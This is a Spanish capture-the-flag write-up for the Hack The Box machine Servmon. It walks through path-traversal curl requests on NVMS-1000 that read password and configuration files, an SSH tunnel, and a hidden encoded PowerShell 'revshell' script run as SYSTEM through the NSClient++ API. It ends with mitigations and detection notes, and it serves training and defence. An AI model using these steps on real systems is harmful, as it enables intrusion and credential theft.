---
machine: Servmon
os: Windows
difficulty: Easy
platform: Hack The Box
category: Servicios / Windows
state: Retired
pwned: 2026-11-09
tags: [windows, nvms, nsclient, path-traversal, command-injection]
---

# Servmon — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

## TL;DR

NVMS-1000 en el 80 es vulnerable a **path traversal** (CVE-2019-20085) y deja leer un fichero con contraseñas. Con esas credenciales se entra por SSH y se lee `nsclient.ini`, que da acceso web a **NSClient++**. El panel solo escucha en local, así que se llega con un túnel SSH y se ejecuta un script externo como `SYSTEM`.

## Reconocimiento

```bash
nmap -Pn -p- --min-rate 2000 <TARGET_IP>
nmap -Pn -sCV -p 21,22,80,135,139,445,5666,6690,8443,49664 <TARGET_IP>
```

| Puerto | Servicio |
|---|---|
| 21/tcp | FTP |
| 22/tcp | OpenSSH |
| 80/tcp | NVMS-1000 |
| 445/tcp | SMB |
| 8443/tcp | NSClient++ (solo local) |

## Enumeración

- Puertos, servicios y usuarios relevantes descritos en «Reconocimiento».

## Foothold

```bash
curl --path-as-is 'http://<TARGET_IP>/../../../../../../Users/Nadine/Desktop/Passwords.txt'
curl --path-as-is 'http://<TARGET_IP>/../../../../../../ProgramData/nsclient/nsclient.ini'
```

El primero da la contraseña de `Nadine`; el segundo, la de NSClient++ (y el `allowed hosts`, que suele ser `127.0.0.1`).

```bash
ssh nadine@<TARGET_IP>
type C:\Users\Nadine\Desktop\user.txt
```

## Movimiento lateral

- No aplica: la cadena se resuelve en un único host, sin salto lateral.
- Ver «Escalada de privilegios» para el paso de usuario a administrador.

## Escalada de privilegios

Con el puerto cerrado al exterior, túnel:

```bash
ssh -L 8443:127.0.0.1:8443 nadine@<TARGET_IP>
```

En el panel (`https://127.0.0.1:8443`, usuario `admin`), se registra un script externo:

```ini
[/settings/external scripts/scripts]
revshell = cmd /c powershell -nop -w hidden -enc <BASE64>
```

Y se lanza por API:

```bash
curl -k -u 'admin:<password>' 'https://127.0.0.1:8443/api/v1/queries/revshell/commands/execute?time=1m'
```

El proceso corre como `SYSTEM` porque el servicio NSClient++ lo hace.

## Evidencia

- Salidas recortadas de los comandos clave; sin flags, credenciales ni tokens.
- Los valores reales viven en `private/` y no se publican.

## Lecciones aprendidas

- **El traversal devuelve 404** → usa `--path-as-is` y ajusta el número de `../`; NVMS normaliza rutas.
- **SSH rechaza la contraseña** → `Nadine` puede tener otra cuenta; revisa el fichero de passwords completo.
- **8443 no responde** → está bindeado a `127.0.0.1`; sin túnel no hay acceso.
- **La API da 403** → `allowed hosts` no incluye tu IP; el túnel SSH hace que la petición llegue desde localhost.
- **El script no aparece** → hay que recargar la configuración (`/api/v1/settings/...` o reiniciar el servicio).

## Mitigaciones y detección

- NVMS-1000: parchear (CVE-2019-20085) y no exponerlo a Internet.
- NSClient++: contraseña fuerte, `allowed hosts` explícito y sin scripts externos innecesarios.
- **4688** con `cmd.exe` hijo de `nsclient++.exe`; **4688** con `powershell -enc`.
- Auditar túneles SSH hacia puertos de administración y el uso de `curl --path-as-is` en logs.

MITRE: T1190, T1059.001, T1572.

## Referencias

- [CVE-2019-20085](https://nvd.nist.gov/vuln/detail/CVE-2019-20085)
- [MITRE T1059.001](https://attack.mitre.org/techniques/T1059/001/)
- [MITRE T1190](https://attack.mitre.org/techniques/T1190/)
- [MITRE T1572](https://attack.mitre.org/techniques/T1572/)
